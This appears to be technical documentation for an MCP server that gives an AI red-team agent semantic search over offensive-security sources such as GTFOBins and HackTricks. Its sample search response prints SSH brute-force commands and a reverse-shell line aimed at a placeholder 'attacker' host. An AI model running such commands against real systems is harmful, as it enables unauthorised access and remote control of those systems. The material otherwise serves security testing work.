# Model Context Protocol (MCP) Implementation
## RAG Knowledge Base for Offensive Security

This document explains our Model Context Protocol server implementation, including protocol details, tool definitions, and integration patterns.

---

## Table of Contents

1. [MCP Overview](#mcp-overview)
2. [Server Implementation](#server-implementation)
3. [Protocol Flow](#protocol-flow)
4. [Tool Definitions](#tool-definitions)
5. [Client Integration](#client-integration)
6. [Troubleshooting](#troubleshooting)

---

## MCP Overview

### What is MCP?

**Model Context Protocol** is a standard for LLMs to access external data sources and tools via a JSON-RPC 2.0 interface.

**Key Concepts**:
- **Server**: Exposes tools and resources (our RAG knowledge base)
- **Client**: Agent that calls tools (our red team agent)
- **Tools**: Functions the LLM can invoke (search, list_techniques)
- **Resources**: Data the LLM can read (not used in our implementation)

**Official Spec**: https://modelcontextprotocol.io/docs/concepts/

---

## Server Implementation

### Technology Stack

```python
# server.py
from flask import Flask, request, jsonify
import faiss
import numpy as np
from sentence_transformers import SentenceTransformer
```

**Components**:
1. **Flask 3.0.0**: Web framework (sync, no async)
2. **Gunicorn**: WSGI server (4 workers)
3. **FAISS**: Vector similarity search (Facebook AI)
4. **sentence-transformers**: Text embeddings (all-MiniLM-L6-v2)

### Server Initialization

```python
app = Flask(__name__)

# Load embedding model (384 dimensions)
model = SentenceTransformer('sentence-transformers/all-MiniLM-L6-v2')

# Load FAISS index and documents
index = faiss.read_index('/data/knowledge_base.faiss')
with open('/data/documents.json', 'r') as f:
    documents = json.load(f)  # 5,395 documents

# MITRE ATT&CK techniques (extracted from documents)
techniques = extract_mitre_techniques(documents)  # 327 techniques
```

### Endpoint Structure

```python
@app.route('/', methods=['POST'])
def handle_mcp():
    """Main MCP endpoint (JSON-RPC 2.0)"""
    payload = request.json
    method = payload.get('method')
    params = payload.get('params', {})
    msg_id = payload.get('id')

    if method == 'initialize':
        return handle_initialize(msg_id)
    elif method == 'tools/list':
        return handle_tools_list(msg_id)
    elif method == 'tools/call':
        return handle_tools_call(params, msg_id)
    elif method == 'notifications/initialized':
        return '', 204  # No response for notifications
    else:
        return jsonrpc_error(msg_id, -32601, f"Method not found: {method}")
```

---

## Protocol Flow

### Complete Handshake Sequence

```
Client                                Server
  │                                     │
  │  1. initialize                      │
  ├────────────────────────────────────>│
  │                                     │
  │  { protocolVersion, capabilities }  │
  │<────────────────────────────────────┤
  │                                     │
  │  2. notifications/initialized       │
  ├────────────────────────────────────>│
  │                                     │
  │  (204 No Content)                   │
  │<────────────────────────────────────┤
  │                                     │
  │  3. tools/list                      │
  ├────────────────────────────────────>│
  │                                     │
  │  { tools: [{name, description}] }   │
  │<────────────────────────────────────┤
  │                                     │
  │  4. tools/call (search)             │
  ├────────────────────────────────────>│
  │                                     │
  │  { content: [results] }             │
  │<────────────────────────────────────┤
```

### 1. Initialize

**Request**:
```json
{
  "jsonrpc": "2.0",
  "id": 0,
  "method": "initialize",
  "params": {
    "protocolVersion": "2024-11-05",
    "capabilities": {},
    "clientInfo": {
      "name": "redteam-agent-blackarch",
      "version": "2.0.0"
    }
  }
}
```

**Response**:
```json
{
  "jsonrpc": "2.0",
  "id": 0,
  "result": {
    "protocolVersion": "2024-11-05",
    "capabilities": {
      "tools": {}
    },
    "serverInfo": {
      "name": "cybersec-rag-mcp",
      "version": "10.0.0"
    }
  }
}
```

### 2. Notifications/Initialized

**Request**:
```json
{
  "jsonrpc": "2.0",
  "method": "notifications/initialized"
}
```

**Response**: `204 No Content` (no ID = notification, not request)

**Critical**: This notification is REQUIRED. Without it, some clients timeout after 90s.

**Bug We Fixed** (October 8, 2025):
```python
# Before (missing handler)
# LM Studio timed out after 90s

# After (3 lines fixed it!)
elif method == 'notifications/initialized':
    return '', 204
```

### 3. Tools/List

**Request**:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/list",
  "params": {}
}
```

**Response**:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "tools": [
      {
        "name": "search",
        "description": "Search cybersecurity knowledge base (GTFOBins, Atomic Red Team, HackTricks) using semantic similarity",
        "inputSchema": {
          "type": "object",
          "properties": {
            "query": {
              "type": "string",
              "description": "Natural language search query (e.g. 'SSH password brute force')"
            },
            "top_k": {
              "type": "integer",
              "description": "Number of results to return",
              "default": 5
            }
          },
          "required": ["query"]
        }
      },
      {
        "name": "list_techniques",
        "description": "List all indexed MITRE ATT&CK techniques",
        "inputSchema": {
          "type": "object",
          "properties": {}
        }
      }
    ]
  }
}
```

### 4. Tools/Call

**Request**:
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "search",
    "arguments": {
      "query": "SSH brute force weak password",
      "top_k": 3
    }
  }
}
```

**Response**:
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "[Rank 1, Score: 0.652]\nSource: atomic-red-team\nFile: T1110.001.yaml\nTechnique: Brute Force: Password Guessing\n\nDescription:\nAdversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained...\n\nTest:\nhydra -l <username> -P <wordlist> ssh://<target>\n\nCommon passwords: password123, admin, root, 12345"
      },
      {
        "type": "text",
        "text": "[Rank 2, Score: 0.589]\nSource: hacktricks\nFile: ssh-brute-force.md\n\nSSH Brute Force\n===============\n\nTools:\n- hydra: hydra -l user -P pass.txt ssh://192.168.1.1\n- medusa: medusa -h 192.168.1.1 -u user -P pass.txt -M ssh\n- nmap: nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt -p 22 target"
      },
      {
        "type": "text",
        "text": "[Rank 3, Score: 0.512]\nSource: gtfobins\nFile: ssh.md\n\nSSH\n===\n\nIf you have SSH access with weak credentials:\n\nPrivilege escalation:\nssh user@target -o ProxyCommand='sh -c \"exec 5<>/dev/tcp/attacker/4444; cat <&5 | sh >&5 2>&5\"'"
      }
    ],
    "isError": false
  }
}
```

---

## Tool Definitions

### Tool 1: search

**Purpose**: Semantic search over offensive security knowledge base

**Implementation**:
```python
def handle_search(query: str, top_k: int = 5):
    # 1. Embed query using sentence-transformers
    query_embedding = model.encode([query])[0]  # Shape: (384,)
    query_vector = np.array([query_embedding], dtype='float32')

    # 2. Search FAISS index (L2 distance)
    distances, indices = index.search(query_vector, top_k)

    # 3. Retrieve documents
    results = []
    for i, idx in enumerate(indices[0]):
        doc = documents[idx]
        score = 1.0 / (1.0 + distances[0][i])  # Convert distance to similarity

        result_text = f"""[Rank {i+1}, Score: {score:.3f}]
Source: {doc['source']}
File: {doc['file']}
{doc.get('technique', '')}

{doc['content'][:800]}
"""
        results.append({"type": "text", "text": result_text})

    return {"content": results, "isError": False}
```

**FAISS Details**:
- **Index Type**: IndexFlatL2 (exact search, no approximation)
- **Distance Metric**: L2 (Euclidean distance)
- **Embedding Dimension**: 384 (all-MiniLM-L6-v2)

**Why L2 Distance?**
- Simple, interpretable
- Works well for technical text
- No need for cosine similarity (already normalized embeddings)

**Performance**:
- Query latency: <100ms (5,395 documents)
- Exact search (no false negatives from approximation)

### Tool 2: list_techniques

**Purpose**: List all indexed MITRE ATT&CK techniques

**Implementation**:
```python
def handle_list_techniques():
    # Pre-extracted at server startup
    technique_list = [
        {"id": "T1110.001", "name": "Brute Force: Password Guessing", "tactic": "Credential Access"},
        {"id": "T1068", "name": "Exploitation for Privilege Escalation", "tactic": "Privilege Escalation"},
        # ... 325 more
    ]

    content = "Available MITRE ATT&CK Techniques:\n\n"
    for tech in technique_list:
        content += f"{tech['id']} - {tech['name']} ({tech['tactic']})\n"

    return {"content": [{"type": "text", "text": content}], "isError": False}
```

**Use Case**:
- Agent explores available techniques
- Filter by tactic (e.g., only show "Privilege Escalation")

---

## Client Integration

### Python Client (Agent Implementation)

```python
class MCPClient:
    def __init__(self, mcp_url: str):
        self.mcp_url = mcp_url
        self.session_id = 0
        self._initialize()

    def _initialize(self):
        """Perform MCP handshake"""
        # Step 1: Initialize
        resp = requests.post(self.mcp_url, json={
            "jsonrpc": "2.0",
            "id": self.session_id,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "redteam-agent", "version": "2.0.0"}
            }
        }, timeout=10)
        self.session_id += 1

        # Step 2: Send initialized notification (CRITICAL!)
        requests.post(self.mcp_url, json={
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        }, timeout=5)

        # Step 3: List tools
        resp = requests.post(self.mcp_url, json={
            "jsonrpc": "2.0",
            "id": self.session_id,
            "method": "tools/list",
            "params": {}
        }, timeout=10)
        self.session_id += 1
        self.tools = resp.json().get("result", {}).get("tools", [])

    def search(self, query: str, top_k: int = 3) -> List[Dict]:
        """Search knowledge base"""
        resp = requests.post(self.mcp_url, json={
            "jsonrpc": "2.0",
            "id": self.session_id,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": query, "top_k": top_k}
            }
        }, timeout=30)
        self.session_id += 1

        result = resp.json().get("result", {})
        if result.get("isError"):
            return []

        return result.get("content", [])
```

### Usage in Agent

```python
# Initialize once
mcp = MCPClient("http://mcp-rag-server.default.svc.cluster.local:8080")

# Query during attack loop
results = mcp.search("SSH brute force", top_k=3)
for result in results:
    print(result['text'])
```

---

## Troubleshooting

### Common Issues

#### 1. Client Times Out After 90s

**Symptom**:
```
requests.exceptions.ReadTimeout: HTTPConnectionPool(...): Read timed out. (read timeout=90)
```

**Cause**: Missing `notifications/initialized` handler

**Fix**:
```python
@app.route('/', methods=['POST'])
def handle_mcp():
    method = payload.get('method')

    if method == 'notifications/initialized':
        return '', 204  # ← THIS IS CRITICAL
```

**Why**: Some MCP clients expect this notification acknowledgment.

#### 2. "Method not found" Error

**Symptom**:
```json
{"error": {"code": -32601, "message": "Method not found: tools/call"}}
```

**Cause**: Missing method handler or typo in method name

**Fix**: Verify exact method name (case-sensitive):
- ✅ `tools/call`
- ❌ `tool/call` (missing 's')
- ❌ `Tools/call` (wrong case)

#### 3. Empty Search Results

**Symptom**: `tools/call` returns `{"content": []}`

**Causes**:
1. Query doesn't match indexed content
2. FAISS index not loaded correctly
3. Embedding model mismatch

**Debug**:
```python
# Check if index loaded
print(f"Index size: {index.ntotal}")  # Should be 5395

# Check embedding dimensions
query_emb = model.encode(["test"])
print(f"Embedding shape: {query_emb.shape}")  # Should be (1, 384)

# Manual search test
distances, indices = index.search(query_emb, k=5)
print(f"Distances: {distances}")
print(f"Indices: {indices}")
```

#### 4. FAISS "Incompatible Index" Error

**Symptom**:
```
RuntimeError: Error in void faiss::read_index(faiss::Index*, faiss::IOReader*)
```

**Cause**: FAISS index created with different version

**Fix**: Rebuild index with current FAISS version:
```python
import faiss
import numpy as np

# Load embeddings (5395 x 384)
embeddings = np.load('embeddings.npy')

# Create new index
index = faiss.IndexFlatL2(384)
index.add(embeddings)

# Save
faiss.write_index(index, 'knowledge_base.faiss')
```

---

## Performance Optimization

### Current Performance

**Metrics** (5,395 documents, IndexFlatL2):
- Query latency: 50-100ms
- Throughput: ~200 queries/sec (single server)
- Memory: ~1GB (index + documents in RAM)

### Scaling Strategies

#### 1. GPU Acceleration

```python
# Move index to GPU (100x faster for large datasets)
import faiss

res = faiss.StandardGpuResources()
index_gpu = faiss.index_cpu_to_gpu(res, 0, index)

# Same API, much faster
distances, indices = index_gpu.search(query_vector, top_k)
```

**Benefit**: 50ms → 0.5ms query latency

#### 2. Approximate Search (for >1M documents)

```python
# Use IVF (Inverted File Index) for approximate search
nlist = 100  # Number of clusters
quantizer = faiss.IndexFlatL2(dimension)
index = faiss.IndexIVFFlat(quantizer, dimension, nlist)

# Train on sample data
index.train(embeddings)
index.add(embeddings)

# Search (nprobe controls accuracy/speed tradeoff)
index.nprobe = 10  # Search 10 nearest clusters
distances, indices = index.search(query_vector, top_k)
```

**Benefit**: Sub-millisecond search for millions of documents

#### 3. Horizontal Scaling

```yaml
# Scale MCP server to 3 replicas
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mcp-rag-server
spec:
  replicas: 3  # Load-balanced by K8s Service
```

**Benefit**: 3x throughput (600 queries/sec)

---

## Data Sources

### Document Collection

**Sources**:
1. **GTFOBins**: https://github.com/GTFOBins/GTFOBins.github.io
   - Format: Markdown files (200+ binaries)
   - Content: Privilege escalation techniques

2. **Atomic Red Team**: https://github.com/redcanaryco/atomic-red-team
   - Format: YAML (5,000+ tests)
   - Content: MITRE ATT&CK mapped techniques

3. **HackTricks**: https://github.com/carlospolop/hacktricks
   - Format: Markdown (200+ pages)
   - Content: Penetration testing playbooks

### Index Building Process

```bash
# 1. Clone repositories
git clone https://github.com/GTFOBins/GTFOBins.github.io
git clone https://github.com/redcanaryco/atomic-red-team
git clone https://github.com/carlospolop/hacktricks

# 2. Parse documents
python scripts/parse_gtfobins.py
python scripts/parse_atomic.py
python scripts/parse_hacktricks.py

# 3. Generate embeddings
python scripts/embed_documents.py  # Uses sentence-transformers

# 4. Build FAISS index
python scripts/build_faiss_index.py

# Output:
# - documents.json (5,395 docs with metadata)
# - knowledge_base.faiss (FAISS index)
```

### Document Schema

```json
{
  "id": 1234,
  "source": "atomic-red-team",
  "file": "T1110.001.yaml",
  "technique": "T1110.001 - Brute Force: Password Guessing",
  "tactic": "Credential Access",
  "content": "Full text content of the document...",
  "embedding": [0.123, -0.456, ...]  // 384 dimensions (not stored in JSON, only in FAISS)
}
```

---

## Future Enhancements

### Planned Features

1. **Technique Filtering**:
   ```python
   def search_by_technique(technique_id: str, top_k: int):
       # Filter documents by MITRE ATT&CK ID
       results = [doc for doc in documents if doc['technique'].startswith(technique_id)]
       return results[:top_k]
   ```

2. **Metadata Filtering**:
   ```python
   def search(query: str, filters: dict):
       # Example: filters = {"tactic": "Privilege Escalation", "source": "gtfobins"}
       results = vector_search(query, top_k=100)
       filtered = [r for r in results if matches_filters(r, filters)]
       return filtered[:top_k]
   ```

3. **Hybrid Search** (keyword + semantic):
   ```python
   # Combine BM25 (keyword) with FAISS (semantic)
   keyword_results = bm25_search(query)
   semantic_results = faiss_search(query)
   combined = merge_and_rerank(keyword_results, semantic_results)
   ```

---

**Document Version**: 1.0
**Last Updated**: October 9, 2025
**MCP Protocol Version**: 2024-11-05
**Status**: Production-ready, 5,395 documents indexed
